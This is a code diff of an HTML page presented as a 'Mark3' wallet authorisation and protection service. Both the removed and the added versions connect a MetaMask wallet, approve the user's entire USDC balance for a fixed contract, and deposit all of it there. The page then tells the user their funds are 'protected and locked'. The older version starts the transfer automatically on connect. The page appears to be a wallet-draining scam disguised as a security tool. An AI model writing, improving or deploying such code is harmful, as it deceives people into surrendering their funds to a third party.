@@ -3,221 +3,92 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="description" content="Mark3 Wallet Authorisation and Protection Interface" />
   <title>Mark3 · Wallet Authorisation & Protection</title>
   <style>
-    :root {
-      --primary: #4e44ce;
-      --error: #ff4444;
-      --success: #00C851;
-      --warning: #ffbb33;
-    }
     body {
       font-family: 'Segoe UI', sans-serif;
-      background: #f8f9fa;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      text-align: center;
+      background: #f4f4f8;
       padding: 2rem;
-      min-height: 100vh;
-      margin: 0;
     }
     button {
       padding: 12px 24px;
-      margin: 8px;
+      margin: 1rem;
+      background: #4e44ce;
+      color: #fff;
       border: none;
       border-radius: 8px;
-      background: var(--primary);
-      color: white;
-      font-weight: bold;
       cursor: pointer;
-      transition: all 0.2s ease;
-      max-width: 300px;
-      width: 100%;
+      font-weight: bold;
     }
-    button:hover:not(:disabled) { opacity: 0.9; transform: translateY(-1px); }
-    button:active:not(:disabled) { transform: translateY(0); }
-    button:disabled { opacity: 0.5; cursor: not-allowed; }
     #status {
-      margin-top: 20px;
-      padding: 12px;
-      border-radius: 8px;
-      background: white;
-      max-width: 500px;
-      word-break: break-word;
-      min-height: 60px;
-      display: flex;
-      align-items: center;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      margin-top: 1rem;
+      font-weight: bold;
     }
-    .error { color: var(--error); }
-    .success { color: var(--success); }
-    .progress { color: var(--warning); }
-    .progress-bar {
-      width: 100%;
-      max-width: 500px;
-      height: 4px;
-      background: #e9ecef;
-      border-radius: 2px;
-      margin-top: 8px;
-      overflow: hidden;
-    }
-    .progress-bar-fill {
-      height: 100%;
-      background: var(--primary);
-      width: 0%;
-      transition: width 0.3s ease;
-    }
-    .status-icon { margin-right: 10px; font-size: 1.2em; }
-    .spinner {
-      border: 4px solid rgba(0,0,0,0.1);
-      border-top: 4px solid var(--primary);
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <h2>Mark3 · Wallet Authorisation & Protection</h2>
+  <h1>Mark3 · Wallet Authorisation & Protection</h1>
   <button id="connect">Connect Wallet</button>
-  <button id="authorize" disabled>Authorise & Secure</button>
-
-  <div id="status"><span class="status-icon">🔒</span><span id="status-text">Status: Connect your wallet</span></div>
-  <div class="progress-bar"><div class="progress-bar-fill" id="progress-bar"></div></div>
-  <div id="tx-hash" style="margin-top: 10px; display: none;"></div>
-  <div id="loader" style="display: none;"><div class="spinner"></div></div>
-
-  <footer style="margin-top: 2rem; font-size: 0.8em; color: #666;">
-    Mark3 Wallet v1.0.0<br/>
-    This platform is a service powered by the Mark3 smart wallet layer.<br/>
-    ✅ Comprehensive wallet monitoring system and automated protection<br/>
-    ✅ Secures your USDC funds and mitigates transfer risks<br/>
-    ✅ Integrates real-time tracking and dynamic threat response technology
-  </footer>
-
+  <button id="protect" disabled>Authorise & Secure</button>
+  <div id="status">Status: Not connected</div>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const CONFIG = {
-      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-      CONTRACT_ADDRESS: "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a",
-      ABI: [
-        "function deposit(uint256 amount) external",
-        "function users(address) view returns (uint256 deposited, bool hasDeposited)"
-      ]
-    };
-
-    const connectBtn = document.getElementById('connect');
-    const authorizeBtn = document.getElementById('authorize');
-    const statusEl = document.getElementById('status');
-    const statusText = document.getElementById('status-text');
-    const progressBar = document.getElementById('progress-bar');
-    const statusIcon = document.querySelector('.status-icon');
-    const loader = document.getElementById('loader');
-    const txHashEl = document.getElementById('tx-hash');
+    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+    const CONTRACT = "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a";
+    const ABI = [
+      "function deposit(uint256 amount) external",
+      "function users(address) view returns (uint256 deposited, bool hasDeposited)",
+      "function approve(address,uint256) returns (bool)",
+      "function balanceOf(address) view returns (uint256)",
+      "function allowance(address,address) view returns (uint256)"
+    ];
 
     let provider, signer, user;
 
-    connectBtn.onclick = async function () {
-      try {
-        if (!window.ethereum) throw new Error("MetaMask not detected.");
-        updateStatus("Connecting... ⏳", "progress");
-        showLoader();
+    const connectBtn = document.getElementById('connect');
+    const protectBtn = document.getElementById('protect');
+    const statusDiv = document.getElementById('status');
 
+    connectBtn.onclick = async () => {
+      try {
+        if (!window.ethereum) throw new Error("MetaMask not installed");
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         user = await signer.getAddress();
-
-        updateStatus(`Connected: ${shortenAddress(user)}`, "success");
-        authorizeBtn.disabled = false;
-        connectBtn.disabled = true;
-        hideLoader();
-
-        // Auto-trigger authorisation
-        handleProtection();
+        statusDiv.textContent = `Connected: ${user}`;
+        protectBtn.disabled = false;
       } catch (err) {
-        showError(err);
-        hideLoader();
+        statusDiv.textContent = `Error: ${err.message}`;
       }
     };
 
-    authorizeBtn.onclick = handleProtection;
-
-    async function handleProtection() {
+    protectBtn.onclick = async () => {
       try {
-        showLoader();
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function approve(address,uint256) returns (bool)",
-          "function balanceOf(address) view returns (uint256)",
-          "function allowance(address,address) view returns (uint256)"
-        ], signer);
+        const contract = new ethers.Contract(CONTRACT, ABI, signer);
+        const usdc = new ethers.Contract(USDC, ABI, signer);
 
-        updateStatus("Checking USDC balance... ⏳", "progress");
-        const balance = await usdc.balanceOf(user);
-        if (balance.isZero()) throw new Error("No USDC balance");
-
-        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
-        if (allowance.lt(balance)) {
-          updateStatus("Authorising contract... ⏳", "progress");
-          const tx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
-          updateTxHash(tx.hash);
-          await tx.wait();
+        const { hasDeposited } = await contract.users(user);
+        if (hasDeposited) {
+          statusDiv.textContent = "Already deposited. No action needed.";
+          return;
         }
 
-        const contract = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, CONFIG.ABI, signer);
-        updateStatus("Securing your funds... ⏳", "progress");
+        const balance = await usdc.balanceOf(user);
+        const allowance = await usdc.allowance(user, CONTRACT);
+        if (allowance.lt(balance)) {
+          const tx1 = await usdc.approve(CONTRACT, balance);
+          await tx1.wait();
+        }
+
         const tx2 = await contract.deposit(balance);
-        updateTxHash(tx2.hash);
         await tx2.wait();
-
-        updateStatus("All set! 🎉 Your funds are now protected and locked.", "success");
-        progressBar.style.width = "100%";
-        statusIcon.textContent = "✅";
-        hideLoader();
+        statusDiv.textContent = `All set! 🎉 Your funds are now protected and locked.`;
       } catch (err) {
-        showError(err);
-        hideLoader();
+        statusDiv.textContent = `❌ Error: ${err.message}`;
       }
-    }
-
-    function updateStatus(message, type) {
-      statusText.textContent = message;
-      statusEl.className = type || '';
-      statusIcon.textContent = getStatusIcon(type);
-    }
-
-    function getStatusIcon(type) {
-      switch(type) {
-        case 'error': return '❌';
-        case 'success': return '✅';
-        case 'progress': return '⏳';
-        default: return '🔒';
-      }
-    }
-
-    function showError(err) {
-      console.error(err);
-      updateStatus(`Error: ${err.message}`, "error");
-      progressBar.style.width = "0%";
-      statusIcon.textContent = "❌";
-      txHashEl.style.display = "none";
-    }
-
-    function showLoader() { loader.style.display = "block"; }
-    function hideLoader() { loader.style.display = "none"; }
-
-    function updateTxHash(hash) {
-      txHashEl.innerHTML = `Transaction: <a href="https://etherscan.io/tx/${hash}" target="_blank">${hash.slice(0, 10)}...${hash.slice(-8)}</a>`;
-      txHashEl.style.display = "block";
-    }
-
-    function shortenAddress(address) {
-      return `${address.slice(0, 6)}...${address.slice(-4)}`;
-    }
+    };
   </script>
 </body>
 </html>
